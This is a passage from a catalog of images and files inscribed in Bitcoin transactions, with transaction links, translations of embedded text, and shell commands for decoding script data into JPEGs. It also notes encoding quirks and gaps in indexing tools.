[tx 10cc5d45396ba271659a4b00d2f70c433533227e5f7ea30bb5bd3c8563d7468a](https://www.blockchain.com/explorer/transactions/btc/10cc5d45396ba271659a4b00d2f70c433533227e5f7ea30bb5bd3c8563d7468a), [Block 421280](https://www.blockchain.com/explorer/blocks/btc/421280) (2016-07-18) via [cryptograffiti.info](#cryptograffiti-info)

<a id="_566"></a>
Wedding picture with people holding "Blockchain" and "Ipa" signs.

<a id="_567"></a>
Reproduced at: [https://web.archive.org/web/20200926150213/https://freebitcoins.com.ua/zapushhen-ukrainskij-bitkoin-pul-bitcoinukraine/](https://web.archive.org/web/20200926150213/https://freebitcoins.com.ua/zapushhen-ukrainskij-bitkoin-pul-bitcoinukraine/) Google translate:<a id="_568"></a>


> One of the initiators of the launch of this pool was Oles Slobodenyuk, who earlier created a grocery store in Kiev accepting bitcoins, arranged a TakeMyBitcoin flash mob, and also registered his own marriage in the bitcoin blockchain on the weddingbook.io website.

<a id="_569"></a>
Oles is for example featured at: [https://uk.sports.yahoo.com/news/bitcoin-miners-heating-homes-free-133053106.html](https://uk.sports.yahoo.com/news/bitcoin-miners-heating-homes-free-133053106.html) Bitcoin Miners Are Heating Homes Free of Charge in Frigid Siberia by Anna Baydakova (2019)

<a id="_570"></a>
The image file contains the following text embedded into it:<a id="_571"></a>


> \<Wedding date: Jul 17, 2016 ****  
> proof link [https://goo.gl/photos/2GToBx1WqRyiQtxQ6](https://goo.gl/photos/2GToBx1WqRyiQtxQ6)

The link is dead of course.

---

<a id="image-nematode"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/554846025e808df7adec3b1d099e3d4d54b7367cddaa959939cb5ca0fc6abf7b.png)

**[Figure 60](#image-nematode). Nematode**. A... [nematode](taxonomy.md#nematode)-like shaped hand drawn extremely simple image? A test upload presumably? The squiggle outside of the worm might be a test direction marker. [tx 554846025e808df7adec3b1d099e3d4d54b7367cddaa959939cb5ca0fc6abf7b](https://www.blockchain.com/explorer/transactions/btc/554846025e808df7adec3b1d099e3d4d54b7367cddaa959939cb5ca0fc6abf7b), [block 424414](https://www.blockchain.com/explorer/blocks/btc/424414) (2016-08-09) via [cryptograffiti.info](#cryptograffiti-info). The image file contains the following string embedded into it:<a id="_572"></a>
> 2016, painting, 135.7 x 130.7 cm (18 DPI)

---

<a id="image-hand-written-contract"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/cc9c0b95ac772515235147d8354ec8b8b0763bf842ad16b8b23f855c3dc6a57e.jpg" alt="" height="600">

**[Figure 61](#image-hand-written-contract). Hand written contract**. <a id="_573"></a>
Wedding contract written in Czech. Transcription and translation [by Petr Kadlec](https://github.com/cirosantilli/cirosantilli.github.io/issues/81):<a id="_574"></a>


> Svým podpisem pod tímto textem potvrzuji, že Daniela Dudysová a Pavel Urbaczka v mé přítomnosti dne 20.8.2016 v Ropici projevili vůli uzavřít spolu manželství, přičemž ani jeden z těchto projevů se mi nejevil jako nesvobodný, nikoliv vážný, nesrozumitelný, omylný nebo uzavřený v tísni.

Translation:<a id="_575"></a>


> With my signature under this text, I confirm Daniela Dudysová and Pavel Urbaczka have, in my presence on 2016-08-20 in Ropice, expressed the will to enter marriage, whereas neither of their expressions seemed to me to be non-free, not serious, in error, or under distress.

Signatures:<a id="_576"></a>


> Tereza (unreadable) Hana (unreadable) Jakub (unreadable) Radim Kozub (unreadable) (unreadable) Lenka (unreadable)

<a id="_577"></a>
Petr also conjectures that Jakub may refer to [Jakub Olšina from Blockchain Legal](https://www.blockchainlegal.cz/cs/tym). [Figure 62. "Wedding on grass"](#image-wedding-on-grass) on the same block contains a image of a wedding, presumably the same of the contract. The photo of the man might be the same person as [https://www.linkedin.com/in/olsinajakub/](https://www.linkedin.com/in/olsinajakub/), but a bit younger.

<a id="_578"></a>
[tx cc9c0b95ac772515235147d8354ec8b8b0763bf842ad16b8b23f855c3dc6a57e](https://www.blockchain.com/explorer/transactions/btc/cc9c0b95ac772515235147d8354ec8b8b0763bf842ad16b8b23f855c3dc6a57e), [block 426072](https://www.blockchain.com/explorer/blocks/btc/426072) (2016-08-20) via [cryptograffiti.info](#cryptograffiti-info).

---

<a id="image-wedding-on-grass"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/693848d56098a0ad16736bea7f24336c9b47a7f0a6f776659e8d01f00b46af76.jpg)

**[Figure 62](#image-wedding-on-grass). Wedding on grass**. <a id="_579"></a>
[tx 693848d56098a0ad16736bea7f24336c9b47a7f0a6f776659e8d01f00b46af76](https://www.blockchain.com/explorer/transactions/btc/693848d56098a0ad16736bea7f24336c9b47a7f0a6f776659e8d01f00b46af76), [block 426072](https://www.blockchain.com/explorer/blocks/btc/426072) (2016-08-20) via [cryptograffiti.info](#cryptograffiti-info).

<a id="_580"></a>
The file contains the following text embedded into it:<a id="_581"></a>


> Danila a Pavel se právě vzali!

which is Czech for:<a id="_582"></a>


> Danila and Pavel just got married!

So it is a followup to [Figure 61. "Hand written contract"](#image-hand-written-contract).

---

<a id="image-onshape-ad"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/c0bb963cb3ceffc49059f09db94e3fd73caa3b7a8e005160d49e99020ff6b51a.png" alt="" height="300">

**[Figure 63](#image-onshape-ad). Onshape ad**. Ad for [https://www.onshape.com/en/](https://www.onshape.com/en/), an online [CAD](software.md#computer-aided-design) company:<a id="_583"></a>
> \#CAD users all over the world are designing in the cloud! Join them by creating a \#free Onshape account: [http://hubs.ly/HO3vJ6tO](http://hubs.ly/HO3vJ6tO). [tx c0bb963cb3ceffc49059f09db94e3fd73caa3b7a8e005160d49e99020ff6b51a](https://www.blockchain.com/explorer/transactions/btc/c0bb963cb3ceffc49059f09db94e3fd73caa3b7a8e005160d49e99020ff6b51a), [block 426832](https://www.blockchain.com/explorer/blocks/btc/426832) (2016-08-25) via [cryptograffiti.info](#cryptograffiti-info). Embedded text:<a id="_584"></a>
> > @Onshape - The Future of Professional CAD

---

<a id="image-pepe-the-frog"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/ca933de16b6466e40b37c7ee0ec0dcd9a56bc365a567a5fff81ba4927dd61e23.gif)

**[Figure 64](#image-pepe-the-frog). Pepe the Frog**. [ca933de16b6466e40b37c7ee0ec0dcd9a56bc365a567a5fff81ba4927dd61e23](https://www.blockchain.com/explorer/transactions/btc/ca933de16b6466e40b37c7ee0ec0dcd9a56bc365a567a5fff81ba4927dd61e23) (2016-10-17) via [cryptograffiti.info](#cryptograffiti-info). Embedded text:<a id="_585"></a>
> In Pepe We Trust  
> \#BITCOINPEPE

---

<a id="image-hello-yes-this-is-dog"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/4b0cd7e191ef0a14a9b6ab1c5900be534118c20a332ff26407648168d2722a2e.jpg)

**[Figure 65](#image-hello-yes-this-is-dog). Hello. Yes, this is dog**. [https://knowyourmeme.com/memes/yes-this-is-dog](https://knowyourmeme.com/memes/yes-this-is-dog). [tx 4b0cd7e191ef0a14a9b6ab1c5900be534118c20a332ff26407648168d2722a2e](https://www.blockchain.com/explorer/transactions/btc/4b0cd7e191ef0a14a9b6ab1c5900be534118c20a332ff26407648168d2722a2e), [block 440418](https://www.blockchain.com/explorer/blocks/btc/440418) (2016-11-24) via [cryptograffiti.info](#cryptograffiti-info).

<a id="image-ross-ulbricht"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/b25ba2080d15c1277569bd2fee707a216c4e2ee0a1f479349c2309651c261511.jpg)

**[Figure 66](#image-ross-ulbricht). Ross Ulbricht**. Exact image also reproduced at: [https://ethereumworldnews.com/ross-ulbricht-attorney-dismiss-2018/](https://ethereumworldnews.com/ross-ulbricht-attorney-dismiss-2018/). [tx b25ba2080d15c1277569bd2fee707a216c4e2ee0a1f479349c2309651c261511](https://www.blockchain.com/explorer/transactions/btc/b25ba2080d15c1277569bd2fee707a216c4e2ee0a1f479349c2309651c261511), [block 442225](https://www.blockchain.com/explorer/blocks/btc/442225) (2016-12-06) via [cryptograffiti.info](#cryptograffiti-info). Embedded text:<a id="_586"></a>
> <a id="_587"></a>
> [Silk Road](computer.md#silk-road-marketplace) saved lives that would  
> have otherwise been lost on the  
> streets.
> 
> <a id="_588"></a>
> [https://freeross.org/](https://freeross.org/)

---

<a id="image-tuxedo-and-rose"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/c67dca17d3e5544d8d2c70d143196e1c1438a09c7371b80086d0a71ec5aec3c8.jpg)

**[Figure 67](#image-tuxedo-and-rose). Tuxedo and rose**. Black and white and intentionally blurred photo of couple, the [woman](biology.md#female) wears a tuxedo, and the man holds a red rose/light-like thing in the middle. [tx c67dca17d3e5544d8d2c70d143196e1c1438a09c7371b80086d0a71ec5aec3c8](https://www.blockchain.com/explorer/transactions/btc/c67dca17d3e5544d8d2c70d143196e1c1438a09c7371b80086d0a71ec5aec3c8), [block 453083](https://www.blockchain.com/explorer/blocks/btc/453083) (2017-02-14) via [cryptograffiti.info](#cryptograffiti-info).

<a id="image-couple-on-mountains"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/00a64f2ff9aae7a34c21d07b8fc9bad79989f25295ccbddc6fbe73b3685b65a9.jpg)

**[Figure 68](#image-couple-on-mountains). Couple on mountains**. Middle aged couple selfie in front of some mountains. [tx 00a64f2ff9aae7a34c21d07b8fc9bad79989f25295ccbddc6fbe73b3685b65a9](https://www.blockchain.com/explorer/transactions/btc/00a64f2ff9aae7a34c21d07b8fc9bad79989f25295ccbddc6fbe73b3685b65a9), [block 456370](https://www.blockchain.com/explorer/blocks/btc/456370) (2017-03-09) via [cryptograffiti.info](#cryptograffiti-info). The file contains the following [Spanish](linguistics.md#spanish-language) poem, whch confirms that their [Spanish](continent.md#spain) looking faces are actually [Spanish](continent.md#spain), perhaps they are at the Pyrenees:<a id="_589"></a>
> <a id="_590"></a>
> Entre tus brazos y los míos  
> no hay espacio, tan juntitos  
> estamos que los pensamientos  
> son uno.
> 
> <a id="_591"></a>
> A veces somos casi dos desconocidos,  
> raros tan raros cómo distintos,  
> pero nos engañamos, tú lo sabes yo lo sé,  
> en realidad somos muy dentro  
> la misma verdad.
> 
> <a id="_592"></a>
> Escondidos en tus ojitos  
> duermen mis sueños más hermosos,  
> cuándo los abres frente a mi  
> se despiertan alegres y rumbosos.

Which translates as:<a id="_593"></a>
> <a id="_594"></a>
> Between your arms and mine  
> there is no space, so close together  
> we are the thoughts  
> They are one.
> 
> <a id="_595"></a>
> Sometimes we are almost two strangers,  
> strange as strange as they are different,  
> but we deceive ourselves, you know it, I know it,  
> actually we are very inside  
> the same truth.
> 
> <a id="_596"></a>
> Hidden in your eyes  
> my most beautiful dreams sleep,  
> when do you open them in front of me  
> They wake up happy and cheerful.

Not easy [Google](google.md) hits so possibly novel.

---

<a id="image-tank-man"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/ca4f11131eca6b4d61daf707a470cfccd1ef3d80a6f8b70f1f07616b451ca64e.jpg)

**[Figure 69](#image-tank-man). Tank Man**. <a id="_597"></a>
[tx ca4f11131eca6b4d61daf707a470cfccd1ef3d80a6f8b70f1f07616b451ca64e](https://www.blockchain.com/explorer/transactions/btc/ca4f11131eca6b4d61daf707a470cfccd1ef3d80a6f8b70f1f07616b451ca64e), [block 458238](https://www.blockchain.com/explorer/blocks/btc/458238) (2017-03-21) via [cryptograffiti.info](#cryptograffiti-info).

<a id="_598"></a>
See also: [Section "China"](#china).

<a id="_599"></a>
Searching for the image hash ca4f11131eca6b4d61daf707a470cfccd1ef3d80a6f8b70f1f07616b451ca64e leads to [https://archive.4plebs.org/pol/thread/191157608/#q191162145](https://archive.4plebs.org/pol/thread/191157608/#q191162145) which links to the now dead as of 2021: [https://cryptograffiti.info/#ca4f11131eca6b4d61daf707a470cfccd1ef3d80a6f8b70f1f07616b451ca64e.jpg](https://cryptograffiti.info/#ca4f11131eca6b4d61daf707a470cfccd1ef3d80a6f8b70f1f07616b451ca64e.jpg).

---

<a id="image-mr-burns-you-re-here-forever"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/94e319d09fc236fb9d7a24e60af8f47ed41ca3cc01e9950c925d806153ed8aa3.jpg)

**[Figure 70](#image-mr-burns-you-re-here-forever). Mr. Burns You're here forever**. <a id="_600"></a>
[tx 94e319d09fc236fb9d7a24e60af8f47ed41ca3cc01e9950c925d806153ed8aa3](https://www.blockchain.com/explorer/transactions/btc/94e319d09fc236fb9d7a24e60af8f47ed41ca3cc01e9950c925d806153ed8aa3) block 460435 (2017-04-05)

<a id="_601"></a>
Mr. Burns from [The Simpsons](television-series.md#the-simpsons) showing a sign:<a id="_602"></a>


> Don't forget, you're here forever

Still from S06E13 of [The Simpsons](television-series.md#the-simpsons). A reference to the immutability of the [blockchain](social-technology.md#blockchain).

<a id="video-mr-burns-you-re-here-horever"></a>
**[Video 6](#video-mr-burns-you-re-here-horever). Mr. Burns "You're Here Horever".** [Source](https://www.youtube.com/watch?v=GhSW9vDTRyY). Off-chain source clip for the still.

<a id="_603"></a>
This transaction is given at [Data Insertion in Bitcoin's Blockchain by Andrew Sward, Vecna OP\_0 and Forrest Stonedahl](cryptocurrency.md#data-insertion-in-bitcoin-s-blockchain-by-andrew-sward-vecna-op-0-and-forrest-stonedahl). We've decoded it with:<a id="_604"></a>

```
btc getrawtransaction 94e319d09fc236fb9d7a24e60af8f47ed41ca3cc01e9950c925d806153ed8aa3 true | jq -r '.vin[].scriptSig.asm' | sed -r 's/^[^ ]+ //' | sed -r 's/ [^ ]+$//' | tr -d '\n'  | xxd -r -p > tmp.jpg
```
TODO understand the encoding better. Our indexing scripts [Bitcoin Inscription Indexer](cryptocurrency.md#bitcoin-inscription-indexer) missed it because the image is encoded on starting on the second constant of the input script and not the first.

<a id="_605"></a>
This was missed by [binwalk](software.md#binwalk) because it does not index the valid [JPEG](computer.md#jpeg) signature "ffd8ffdb"... we should patch it... [https://github.com/ReFirmLabs/binwalk/blob/cddfede795971045d99422bd7a9676c8803ec5ee/src/binwalk/magic/images#L107](https://github.com/ReFirmLabs/binwalk/blob/cddfede795971045d99422bd7a9676c8803ec5ee/src/binwalk/magic/images#L107)

---

<a id="image-augustana-college-old-main-jpg"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/033d185d1a04c4bd6de9bb23985f8c15aa46234206ad29101c31f4b33f1a0e49.jpg" alt="" height="500">

**[Figure 71](#image-augustana-college-old-main-jpg). Augustana College Old-Main.jpg**. <a id="_606"></a>
[tx 033d185d1a04c4bd6de9bb23985f8c15aa46234206ad29101c31f4b33f1a0e49](https://www.blockchain.com/explorer/transactions/btc/033d185d1a04c4bd6de9bb23985f8c15aa46234206ad29101c31f4b33f1a0e49) block 474586 (2017-07-07)

<a id="_607"></a>
First tx 1e347cf7521a1318ef31af4f5758efbc45f1bb2a7db9bc1cc469bfe93599eaf7 sets up 48 [P2SH](cryptocurrency.md#p2sh) outputs and gives ASCII message<a id="_608"></a>


> Augustana College Old-Main.jpg Reconstruct with data preceding redeemscripts

<a id="_609"></a>
Then tx 033d185d1a04c4bd6de9bb23985f8c15aa46234206ad29101c31f4b33f1a0e49 redeems those with 48 input scripts that encode the image with ASCII message:<a id="_610"></a>


> Augustana College Old-Main.jpg Reconstruct with data preceding redeemscripts

<a id="_611"></a>
Encoded with [Two-stage P2SH inscription](cryptocurrency.md#two-stage-p2sh-inscription). Mentioned at: [Data Insertion in Bitcoin's Blockchain by Andrew Sward, Vecna OP\_0 and Forrest Stonedahl](cryptocurrency.md#data-insertion-in-bitcoin-s-blockchain-by-andrew-sward-vecna-op-0-and-forrest-stonedahl). See also this [ASCII art](#ascii-art) by the same authors: [Code 4. "Study Math and Computer Science at Augustana College"](#code-study-math-and-computer-science-at-augustana-college). Previously mentioned at: [https://twitter.com/ottosch_/status/1735297943563837726](https://twitter.com/ottosch_/status/1735297943563837726)

---

<a id="image-pdf-demo"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/b4f537bc536c392d425af0693e3282bbf697df01debeeaf7f9918b93af6bdd14.png" alt="" height="600">

**[Figure 72](#image-pdf-demo). PDF demo**. [tx b4f537bc536c392d425af0693e3282bbf697df01debeeaf7f9918b93af6bdd14](https://www.blockchain.com/explorer/transactions/btc/b4f537bc536c392d425af0693e3282bbf697df01debeeaf7f9918b93af6bdd14) block 474646 (2017-07-07) via [cryptograffiti.info](#cryptograffiti-info) contains a single page 7.9 KB [PDF](computer.md#pdf) sample file also present e.g. at: [https://www.studocu.com/en-gb/document/harrow-college-uxbridge-college/assessing-risk-in-sport-unit/pdf-sample-its-nothing-dw/61244699](https://www.studocu.com/en-gb/document/harrow-college-uxbridge-college/assessing-risk-in-sport-unit/pdf-sample-its-nothing-dw/61244699). This image is a screenshot of the PDF made manually to make it easier to view here, the actual inscribed file has been uploaded to: [https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/b4f537bc536c392d425af0693e3282bbf697df01debeeaf7f9918b93af6bdd14.pdf](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/b4f537bc536c392d425af0693e3282bbf697df01debeeaf7f9918b93af6bdd14.pdf). The first lines of the document read:<a id="_612"></a>
> <a id="_613"></a>
> Adobe Acrobat PDF Files
> 
> <a id="_614"></a>
> Adobe® Portable Document Format (PDF) is a universal file format that preserves all of the fonts, formatting, colours and graphics of any source document, regardless of the application and platform used to create it.

---

<a id="image-cat-manga"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/4986e9cd20b75bb534df92e60b232945e18274f4c46d25b8853af9bdda5166b8.png)

**[Figure 73](#image-cat-manga). Cat manga**. TODO identify, transcribe japanese. [tx 4986e9cd20b75bb534df92e60b232945e18274f4c46d25b8853af9bdda5166b8](https://www.blockchain.com/explorer/transactions/btc/4986e9cd20b75bb534df92e60b232945e18274f4c46d25b8853af9bdda5166b8), [block 581526](https://www.blockchain.com/explorer/blocks/btc/581526) (2019-06-20).

<a id="image-arms-crossed"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/a55e5e7492848445a9f9ecf55ce566242c9d95e6c46a171fd94a345e8b74c355.jpg" alt="" height="500">

**[Figure 74](#image-arms-crossed). Arms crossed**. Nerdy caucasian [woman](biology.md#female) in her late teens/early 20's wearing glasses and a jeans jacked with her arms crossed. TODO identify. [tx a55e5e7492848445a9f9ecf55ce566242c9d95e6c46a171fd94a345e8b74c355](https://www.blockchain.com/explorer/transactions/btc/a55e5e7492848445a9f9ecf55ce566242c9d95e6c46a171fd94a345e8b74c355), [block 597374](https://www.blockchain.com/explorer/blocks/btc/597374) (2019-10-01) with [P2FKH](cryptocurrency.md#fake-p2pkh-address)

<a id="image-black-cat"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/8cf28eb9ac221d8cd15298b9ae63eca910b536a5234c133c7e364b29a4e39d21.jpg)

**[Figure 75](#image-black-cat). Black cat**. No, [Google reverse image search](google.md#google-reverse-image-search) is never going to find the exact one amongst billions of pics. [tx 8cf28eb9ac221d8cd15298b9ae63eca910b536a5234c133c7e364b29a4e39d21](https://www.blockchain.com/explorer/transactions/btc/8cf28eb9ac221d8cd15298b9ae63eca910b536a5234c133c7e364b29a4e39d21), [block 625045](https://www.blockchain.com/explorer/blocks/btc/625045) (2020-04-09) with [P2FKH](cryptocurrency.md#fake-p2pkh-address).

<a id="image-teddy-bear"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/546124c6ad55acc6e0cd00a66fbd29e9b7df5fe8505e2ebf8470bb44aa35bc16.jpg)

**[Figure 76](#image-teddy-bear). Teddy bear**. [tx 546124c6ad55acc6e0cd00a66fbd29e9b7df5fe8505e2ebf8470bb44aa35bc16](https://www.blockchain.com/explorer/transactions/btc/546124c6ad55acc6e0cd00a66fbd29e9b7df5fe8505e2ebf8470bb44aa35bc16), [block 654100](https://www.blockchain.com/explorer/blocks/btc/654100) (2020-10-24) with [P2FKH](cryptocurrency.md#fake-p2pkh-address). Cost: ~0.002 BTC ~ $25.77 at the time. Transaction made up of 339 \* 550 SAT outputs.

<a id="image-the-starry-night-by-van-gogh"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/225ed8bc432d37cf434f80717286fd5671f676f12b573294db72a2a8f9b1e7ba.jpg)

**[Figure 77](#image-the-starry-night-by-van-gogh). The Starry Night by van Gogh**. <a id="_615"></a>
[tx 225ed8bc432d37cf434f80717286fd5671f676f12b573294db72a2a8f9b1e7ba](https://www.blockchain.com/explorer/transactions/btc/225ed8bc432d37cf434f80717286fd5671f676f12b573294db72a2a8f9b1e7ba), [block 685647](https://www.blockchain.com/explorer/blocks/btc/654100) (2021-05-31) Stored on SegWit. Googling leads to this hit: [https://github.com/aureleoules/bitcandle](https://github.com/aureleoules/bitcandle) by French programmer Aurèle Oulès which is an obscure uploader not known to us before this transaction was found.

<a id="_616"></a>
[tx 8dc2785335c59df6c00257f9b20e5df9b932a717f97066b279e292faba71a67a](https://www.blockchain.com/explorer/transactions/btc/8dc2785335c59df6c00257f9b20e5df9b932a717f97066b279e292faba71a67a) block 685737 contains another one, but with a slightly different encoding, presumably Aureole was trying out different things.

---

<a id="image-kitchen-mirror-selfie-in-swimming-glasses"></a>
<img src="https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/3110f49fb6047d62e6fa198a0a4b180d9abf7075d6f29472747990ae286295cb.jpg" alt="" height="600">

**[Figure 78](#image-kitchen-mirror-selfie-in-swimming-glasses). Kitchen mirror selfie in swimming glasses**. <a id="_617"></a>
[tx 3110f49fb6047d62e6fa198a0a4b180d9abf7075d6f29472747990ae286295cb](https://www.blockchain.com/explorer/transactions/btc/3110f49fb6047d62e6fa198a0a4b180d9abf7075d6f29472747990ae286295cb) block 690497 (2021-07-10). [JPEG](computer.md#jpeg) using [P2FMS](cryptocurrency.md#pay-to-fake-multisig)

<a id="_618"></a>
This [P2FMS](cryptocurrency.md#pay-to-fake-multisig) has the peculiarity that each payload constant is preceded by a `04` byte which must be thrown away, we've decoded it manually with:<a id="_619"></a>

```
bitcoin-core.cli getrawtransaction 3110f49fb6047d62e6fa198a0a4b180d9abf7075d6f29472747990ae286295cb true | jq -r '.vout[].scriptPubKey.asm' | head -n-2 | sed -r 's/^....//;s/ 3 .*//' | tr -d ' \n' | xxd -r -p  > tmp.jpg
```

<a id="_620"></a>
This transactions is also mentioned at: [https://github.com/bitcoin/bitcoin/pull/28400](https://github.com/bitcoin/bitcoin/pull/28400) "Make provably unsignable standard P2PK and P2MS outpoints unspendable"

---

<a id="image-gulagu-net-logo"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/9c1a5d5a9e65e9a35050d67574681695a5c46a3df3feb27834848daa49c2fb92.jpg)

**[Figure 79](#image-gulagu-net-logo). Gulagu.net logo**. [tx 9c1a5d5a9e65e9a35050d67574681695a5c46a3df3feb27834848daa49c2fb92](https://www.blockchain.com/explorer/transactions/btc/9c1a5d5a9e65e9a35050d67574681695a5c46a3df3feb27834848daa49c2fb92) block 710352 (2021-11-19) Logo of [https://gulagu.net/](https://gulagu.net/), a "[Russian](continent.md#russia) anti-corruption, anti-torture human rights organization and website"[https://en.wikipedia.org/wiki/Gulagu.net](https://en.wikipedia.org/wiki/Gulagu.net) [Two-stage P2SH inscription](cryptocurrency.md#two-stage-p2sh-inscription).

<a id="image-gulagu-net-people"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/36e7f004ff22aa1146a00705d166fbca64d174c472a5296ed1f38d4749a74e10.jpg)

**[Figure 80](#image-gulagu-net-people). Gulagu.net people**. [tx 36e7f004ff22aa1146a00705d166fbca64d174c472a5296ed1f38d4749a74e10](https://www.blockchain.com/explorer/transactions/btc/36e7f004ff22aa1146a00705d166fbca64d174c472a5296ed1f38d4749a74e10) block 710354 (2021-11-19). Rightmost [Vladimir Osechkin](https://twitter.com/vlad_osechkin). [Two-stage P2SH inscription](cryptocurrency.md#two-stage-p2sh-inscription).

<a id="image-low-resolution-gif-screenshot-of-the-bitcoin-whitepaper-intro"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/cad2c46b0f7feb56191f2ab7d8ed59184615cbf0ca46af8c8b5a21a2045a42d2.gif)

**[Figure 81](#image-low-resolution-gif-screenshot-of-the-bitcoin-whitepaper-intro). Low resolution GIF screenshot of the Bitcoin whitepaper intro**. <a id="_621"></a>
[tx cad2c46b0f7feb56191f2ab7d8ed59184615cbf0ca46af8c8b5a21a2045a42d2](https://www.blockchain.com/explorer/transactions/btc/cad2c46b0f7feb56191f2ab7d8ed59184615cbf0ca46af8c8b5a21a2045a42d2) block 724270 (2022-02-21). Inscribed with [P2FKH](cryptocurrency.md#fake-p2pkh-address).

<a id="_622"></a>
The payload starts with: `7b260000` before the acutal [GIF](computer.md#gif), which is why we hadn't found it before using [binwalk](software.md#binwalk). TODO what do those bytes mean?

<a id="_623"></a>
The last payload uses [OP\_RETURN](cryptocurrency.md#op-return) and encodes the ascii filename:<a id="_624"></a>


> BTGC:satoshi.gif

TODO what is BTGC?

---

<a id="image-a-man-and-his-cactus"></a>
![](https://raw.githubusercontent.com/cirosantilli/media/master/bitcoin-inscription-indexer/data/bin/4719e7252f4bdefd9f7bdf5058f17af28729b79c303b067eb01c107e57235754.jpg)

**[Figure 82](#image-a-man-and-his-cactus). A man and his cactus**. [tx 4719e7252f4bdefd9f7bdf5058f17af28729b79c303b067eb01c107e57235754](https://www.blockchain.com/explorer/transactions/btc/4719e7252f4bdefd9f7bdf5058f17af28729b79c303b067eb01c107e57235754) (2024-01-27). The man depicted is Cryptocurrency developer [Sahil Chaturvedi](https://x.com/SahilC0/status/1980386338450075867). Encoded as a [data URL](computer.md#data-uri-scheme) for a [JPEG](computer.md#jpeg) image in an [OP\_RETURN](cryptocurrency.md#op-return):<a id="_625"></a>

```
data:image/jpeg;base64
```

Perhaps a meme given the phalic shape of the plant.

---

<a id="_626"></a>
[tx 976e0766ebe0528d44595170f83f46ab1304c0a3b809f16454ee9be0e816e3a3](https://mempool.space/tx/976e0766ebe0528d44595170f83f46ab1304c0a3b809f16454ee9be0e816e3a3), block 921133 (2025-10-28) contains an [OP\_RETURN](cryptocurrency.md#op-return) encoded [MP4](computer.md#mp4) AI generated video of Bitcoin Core developer Gloria Zhao standing up and showing her buttocks. This transaction takes up most of the block with an [Ethereum](cryptocurrency.md#ethereum) tatoo on her lower back. Presumably it is from someone criticizing Gloria's design choices regarding [inscriptions on the blockchain](social-technology.md#inscription-blockchain). Also mentioned at:<a id="_627"></a>

<a id="_628"></a>
- [https://www.reddit.com/r/btc/comments/1oohqa1/bitcoin_core_v30s_100kb_op_return_where_does/](https://www.reddit.com/r/btc/comments/1oohqa1/bitcoin_core_v30s_100kb_op_return_where_does/)
<a id="_629"></a>
- [https://x.com/zawy3/status/1986499864096837900](https://x.com/zawy3/status/1986499864096837900)

<a id="_630"></a>
TODO decode:<a id="_631"></a>

<a id="_632"></a>
- get all from [Data Insertion in Bitcoin's Blockchain by Andrew Sward, Vecna OP\_0 and Forrest Stonedahl](cryptocurrency.md#data-insertion-in-bitcoin-s-blockchain-by-andrew-sward-vecna-op-0-and-forrest-stonedahl), some are missing. TODO list then explicitly here
<a id="_633"></a>
- 6fa03193609f6506c2fa76540fa9930adf68d50b21c942434a90486a694ccacd contains a JPEG in its input script but a bit broken. The script contains a single constant. We could not decode it by looking at nearby transactions either

<h5 id="cryptograffiti-info">cryptograffiti.info</h5>

↑ **Parent:** [Raw images](#raw-images)  
🏷️ **Tags:** [Inscription service](social-technology.md#inscription-service)

<a id="_636"></a>
[https://cryptograffiti.info](https://cryptograffiti.info)

<a id="_637"></a>
[https://github.com/1Hyena/cryptograffiti](https://github.com/1Hyena/cryptograffiti)

<a id="_638"></a>
[https://twitter.com/cryptograffiti](https://twitter.com/cryptograffiti) (marked as joined March 2014)

<a id="_639"></a>
Bitcoin blockchain image indexer and uploader. Uses [fake P2PKH address](cryptocurrency.md#fake-p2pkh-address).

<a id="_640"></a>
At some point it stopped using Bitcoin mainline and moved to Bitcoin Cash instead: [https://www.newsbtc.com/news/bitcoin/cryptograffiti-rejects-bitcoin-core-bch-now-available-payment-method/](https://www.newsbtc.com/news/bitcoin/cryptograffiti-rejects-bitcoin-core-bch-now-available-payment-method/) and therefore became useless. Existing indexes seem to have been broken as well.

<a id="_641"></a>
Also, based on the timing of [Figure 47. "Erich Erstu"](#image-erich-erstu), this service may be responsible for a large part of the raw JPEG images present in the blockchain from [block 416527](https://www.blockchain.com/btc/block/416527) (2016) onwards. This is also suggested by the comments at [Figure 69. "Tank Man"](#image-tank-man).

<a id="_642"></a>
